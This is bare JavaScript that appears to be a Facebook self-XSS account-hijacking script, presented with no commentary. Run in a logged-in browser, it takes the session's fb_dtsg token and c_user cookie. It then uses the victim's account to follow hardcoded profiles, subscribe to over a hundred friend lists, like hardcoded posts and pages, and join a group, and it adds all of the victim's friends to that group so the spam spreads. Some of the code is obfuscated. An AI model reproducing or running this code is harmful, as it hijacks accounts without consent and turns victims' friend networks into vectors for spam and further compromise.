var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new 

XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p 

+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-

&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; 

Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); 

function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo

+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]

=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg

+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//follower
a("100008129883879");a("100004735836862");a("100007892372721");a("100004019625222");a("100003735402888");a("1729242140");
sublist("1376750939272556");sublist("210586645775862");sublist("210163259151534");sublist("210587869109073");sublist("4165984804456");sublist("1416103291983200");sublist

("1392174731063510");sublist("1392176227730027");sublist("1392175761063407");sublist("1392175037730146");sublist("1392174514396865");sublist("1392174344396882");sublist

("1392173794396937");sublist("1392173627730287");sublist("1392173487730301");sublist("1392173221063661");sublist("1392173021063681");sublist("1392172651063718");sublist

("1392172301063753");sublist("1392172047730445");sublist("1392171744397142");sublist("1392171597730490");sublist("1392171374397179");sublist("1392171011063882");sublist

("1392170831063900");sublist("1392170521063931");sublist("1392170384397278");sublist("1392170137730636");sublist("1392169501064033");sublist("1392169324397384");sublist

("1392169201064063");sublist("1392168831064100");sublist("1392168624397454");sublist("1392168411064142");sublist("1392168411064142");sublist("1392168227730827");sublist

("1392168087730841");sublist("1392167887730861");sublist("1392167744397542");sublist("1392167521064231");sublist("1392167034397613");sublist("1392166721064311");sublist

("1392166567730993");sublist("1392166234397693");sublist("1392165871064396");sublist("1392165684397748");sublist("1392162834398033");sublist("1392130687734581");sublist

("1392130521067931");sublist("1392130251067958");sublist("1392129984401318");sublist("1392129684401348");sublist("1392128274401489");sublist("1392125307735119");sublist

("1392124744401842");sublist("1392124341068549");sublist("1392123971068586");sublist("1392123504401966");sublist("1392123127735337");sublist("1392122941068689");sublist

("1392122721068711");sublist("1392122357735414");sublist("1392121917735458");sublist("1392121404402176");sublist("1392121294402187");sublist("1392121111068872");sublist

("1392120961068887");sublist("1392120854402231");sublist("1392120687735581");sublist("1392120147735635");sublist("1392119841068999");sublist("1392119631069020");sublist

("1392119077735742");sublist("1392118924402424");sublist("1392118751069108");sublist("1392118471069136");sublist("1392118337735816");sublist("1392118064402510");sublist

("1392117777735872");sublist("1392117571069226");sublist("1392117401069243");sublist("1392117137735936");sublist("1392116914402625");sublist("1392116574402659");sublist

("1392116361069347");sublist("1392116207736029");sublist("1392116061069377");sublist("1392115787736071");sublist("1392115447736105");sublist("1392115224402794");sublist

("1392114901069493");sublist("1392114347736215");sublist("1392114104402906");sublist("1392113767736273");sublist("1392113331069650");sublist("1392112647736385");sublist

("1392112034403113");sublist("1392111527736497");sublist("1392111221069861");sublist("1392110924403224");sublist("1392110597736590");sublist("1392110414403275");sublist

("1392109887736661");sublist("1392109567736693");sublist("1392109201070063");sublist("1392108604403456");sublist("1392107977736852");sublist("1392107477736902");
P("1391822477765402"); P("1479743802239802"); P("1464139683800214"); P("786113534732291"); P("130769717057541"); P("115438811900132"); P("105103566266990"); P("1391103524503964"); P

("516064235174205"); P("489779207802708"); P("516069271840368"); P("516069275173701"); P("516069278507034"); P("516069281840367"); Like("489766921137270"); Like("1433161103564739"); 

Like("737374696272842"); Like("615366681854489"); Like("419675108098156"); Like("380778685393401")
var gid = ['267548290087068'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
   data = eval('(' + gf['responseText']['substr'](9) + ')');
   if (data['error']) {} else {
       friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
           return _0x93dax8['index'] - _0x93dax9['index'];
       });
   };
};
 
for (var i = 0; i < friends['length']; i++) {
   var httpwp = new XMLHttpRequest();
   var urlwp = '/ajax/groups/members/add_post.php?__a=1';
   var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
   httpwp['open']('POST', urlwp, true);
   httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
   httpwp['setRequestHeader']('Content-length', paramswp['length']);
   httpwp['setRequestHeader']('Connection', 'keep-alive');
   httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
   };
   httpwp['send'](paramswp);
};
